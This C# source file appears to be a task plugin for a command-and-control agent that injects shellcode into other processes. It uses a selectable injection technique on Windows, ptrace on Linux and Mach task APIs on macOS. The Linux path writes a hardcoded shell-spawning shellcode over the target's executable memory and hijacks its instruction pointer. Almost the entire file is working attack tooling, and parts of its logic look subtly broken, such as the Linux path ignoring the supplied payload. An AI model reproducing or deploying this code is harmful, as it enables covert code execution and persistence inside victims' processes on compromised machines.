using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Text.Json;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "inject-shellcode";
        private IDataBroker messageManager { get; set; }
        private IServiceConfig config { get; set; }
        private ILogger logger { get; set; }
        private IRuntimeExecutor spawner { get; set; }
        private List<ITechnique> techniques = new List<ITechnique>();

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.spawner = context.Spawner;
            this.logger = context.Logger;
            this.config = context.Config;
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                GetTechniques();
            }
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
            string message = string.Empty;
            if (args is null || !args.Validate(out message))
            {
                DebugLog.Log($"{Name} invalid args: {message} [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
            DebugLog.Log($"{Name} shellcode size={buf.Length} [{job.task.id}]");

            try
            {
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    await ExecuteWindows(args, buf, job);
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    ExecuteLinux(args, buf, job);
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    ExecuteMacOS(args, buf, job);
                }
                else
                {
                    messageManager.Write(
                        "Unsupported platform for inject-shellcode",
                        job.task.id, true, "error");
                }
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} exception: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        // === Windows path ===
        private async Task ExecuteWindows(InjectArgs args, byte[] buf, ServerJob job)
        {
            SpawnOptions so = args.GetSpawnOptions(job.task.id);
            var technique = techniques.Where(x => x.id == this.config.inject).First();
            if (technique is null)
            {
                DebugLog.Log($"{Name} technique not found [{job.task.id}]");
                await WriteDebug("Failed to find technique", job.task.id);
                return;
            }

            DebugLog.Log($"{Name} injecting with technique {this.config.inject} [{job.task.id}]");
            if (!await technique.Inject(spawner, so, buf))
            {
                DebugLog.Log($"{Name} injection failed [{job.task.id}]");
                messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
            }
        }

        // === Linux path ===
        private void ExecuteLinux(InjectArgs args, byte[] buf, ServerJob job)
        {
            DebugLog.Log($"{Name} shellcode size={buf.Length}, target pid={args.pid} [{job.task.id}]");

            int pidMax = GetProcPidMax();
            long victimPid = (long)args.pid;
            if (victimPid == 0 || victimPid > pidMax)
            {
                DebugLog.Log($"{Name} invalid pid {victimPid} [{job.task.id}]");
                messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
                return;
            }

            // Attach to the victim process.
            if (PTrace.PtraceAttach(victimPid) < 0)
            {
                DebugLog.Log($"{Name} PTRACE_ATTACH failed [{job.task.id}]");
                messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }
            PTrace.Wait(null);

            messageManager.WriteLine($"[*] Attach to the process with PID {victimPid}.", job.task.id, false);

            // Save old register state.
            PTrace.UserRegs oldRegs;
            if (PTrace.PtraceGetRegs(victimPid, out oldRegs) < 0)
            {
                messageManager.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }

            long address = ParseMapsFile(victimPid);

            int payloadSize = SHELLCODE.Length;
            ulong[] payload = new ulong[payloadSize / 8];

            messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);

            for (int i = 0; i < payloadSize; i += 8)
            {
                ulong value = BitConverter.ToUInt64(SHELLCODE, i);
                if (PTrace.PtracePokeText(victimPid, address + i, value) < 0)
                {
                    messageManager.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                    return;
                }
            }

            messageManager.WriteLine("[*] Jumping to the injected code.", job.task.id, true, "error");
            PTrace.UserRegs regs = oldRegs;
            regs.rip = (ulong)address;

            if (PTrace.PtraceSetRegs(victimPid, regs) < 0)
            {
                messageManager.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }

            if (PTrace.PtraceCont(victimPid, IntPtr.Zero) < 0)
            {
                messageManager.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                return;
            }

            messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }

        // === macOS path ===
        private void ExecuteMacOS(InjectArgs args, byte[] buf, ServerJob job)
        {
            DebugLog.Log(
                $"{Name} shellcode size={buf.Length}, target pid={args.pid} [{job.task.id}]");
            InjectIntoProcess(args.pid, buf, job.task.id);
        }

        private void InjectIntoProcess(int pid, byte[] shellcode, string taskId)
        {
            uint selfTask = MachApi.mach_task_self();

            int kr = MachApi.task_for_pid(selfTask, pid, out uint remoteTask);
            if (kr != 0)
            {
                messageManager.Write(
                    $"task_for_pid failed (kern_return={kr}). Needs root or entitlement.",
                    taskId, true, "error");
                return;
            }

            messageManager.WriteLine(
                $"[*] Got task port for PID {pid}.", taskId, false);

            ulong remoteAddr = 0;
            ulong size = (ulong)shellcode.Length;

            kr = MachApi.mach_vm_allocate(remoteTask, ref remoteAddr, size,
                MachApi.VM_FLAGS_ANYWHERE);
            if (kr != 0)
            {
                messageManager.Write(
                    $"mach_vm_allocate failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            messageManager.WriteLine(
                $"[*] Allocated {size} bytes at 0x{remoteAddr:X}.", taskId, false);

            kr = MachApi.mach_vm_write(remoteTask, remoteAddr, shellcode,
                (uint)shellcode.Length);
            if (kr != 0)
            {
                messageManager.Write(
                    $"mach_vm_write failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            kr = MachApi.mach_vm_protect(remoteTask, remoteAddr, size, 0,
                MachApi.VM_PROT_READ_EXECUTE);
            if (kr != 0)
            {
                messageManager.Write(
                    $"mach_vm_protect failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            bool isArm = RuntimeInformation.ProcessArchitecture ==
                Architecture.Arm64;

            int flavor = isArm
                ? MachApi.ARM_THREAD_STATE64
                : MachApi.x86_THREAD_STATE64;
            uint stateCount = isArm
                ? MachApi.ARM_THREAD_STATE64_COUNT
                : MachApi.x86_THREAD_STATE64_COUNT;

            ulong[] state = new ulong[stateCount];
            if (isArm)
            {
                state[32] = remoteAddr; // pc
            }
            else
            {
                state[16] = remoteAddr; // rip
            }

            kr = MachApi.thread_create_running(remoteTask, flavor, state,
                stateCount, out _);
            if (kr != 0)
            {
                messageManager.Write(
                    $"thread_create_running failed (kern_return={kr}).",
                    taskId, true, "error");
                return;
            }

            messageManager.Write(
                $"[*] Successfully injected {shellcode.Length} bytes into PID {pid} and started thread.",
                taskId, true);
            DebugLog.Log($"{Name} completed [{taskId}]");
        }

        // === Windows helpers ===
        private void GetTechniques()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach(Type t in asm.GetTypes())
            {
                if (!typeof(ITechnique).IsAssignableFrom(t))
                {
                    continue;
                }
                try
                {
                    var instance = (ITechnique)Activator.CreateInstance(t);
                    if (instance is not null){
                        techniques.Add(instance);
                    }
                }
                catch (MissingMethodException)
                {
                    // Type implements ITechnique but has no parameterless
                    // constructor (e.g. abstract base class)
                    continue;
                }
            }
        }

        private async Task WriteDebug(string message, string task_id){
            if (config.debug)
            {
                this.messageManager.WriteLine(message, task_id, false);
            }
        }

        // === Linux helpers ===
        const int PID_MAX = 32768;
        const int PID_MAX_STR_LENGTH = 64;

        // http://shell-storm.org/shellcode/files/shellcode-806.php
        static readonly byte[] SHELLCODE = new byte[]
        {
        0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7,
        0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, 0x3B, 0x0F, 0x05
        };

        private int GetProcPidMax()
        {
            string pidMaxFilePath = "/proc/sys/kernel/pid_max";

            try
            {
                using (StreamReader pidMaxFile = new StreamReader(pidMaxFilePath))
                {
                    return int.Parse(pidMaxFile.ReadToEnd());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading {pidMaxFilePath}: {ex.Message}");
                Console.WriteLine("Using default.");
                return PID_MAX;
            }
        }

        private string GetPermissionsFromLine(string line)
        {
            int firstSpace = -1;
            int secondSpace = -1;

            for (int i = 0; i < line.Length; i++)
            {
                if (line[i] == ' ' && firstSpace == -1)
                {
                    firstSpace = i + 1;
                }
                else if (line[i] == ' ' && firstSpace != -1)
                {
                    secondSpace = i;
                    break;
                }
            }

            if (firstSpace != -1 && secondSpace != -1 && secondSpace > firstSpace)
            {
                return line.Substring(firstSpace, secondSpace - firstSpace);
            }

            return null;
        }

        private long GetAddressFromLine(string line)
        {
            int addressLastOccurrenceIndex = -1;

            for (int i = 0; i < line.Length; i++)
            {
                if (line[i] == '-')
                {
                    addressLastOccurrenceIndex = i;
                }
            }

            if (addressLastOccurrenceIndex == -1)
            {
                Console.WriteLine($"Could not parse address from line '{line}'. Aborting.");
                return -1;
            }

            string addressLine = line.Substring(0, addressLastOccurrenceIndex);
            return Convert.ToInt64(addressLine, 16);
        }

        private long ParseMapsFile(long victimPid)
        {
            string mapsFileName = $"/proc/{victimPid}/maps";

            try
            {
                using (StreamReader mapsFile = new StreamReader(mapsFileName))
                {
                    string line;
                    while ((line = mapsFile.ReadLine()) != null)
                    {
                        string permissions = GetPermissionsFromLine(line);

                        if (permissions == null)
                        {
                            continue;
                        }
                        else if (permissions.StartsWith("r-xp"))
                        {
                            Console.WriteLine($"[*] Found section mapped with {permissions} permissions.");
                            return GetAddressFromLine(line);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error opening {mapsFileName} file: {ex.Message}");
            }

            return -1;
        }
    }
}
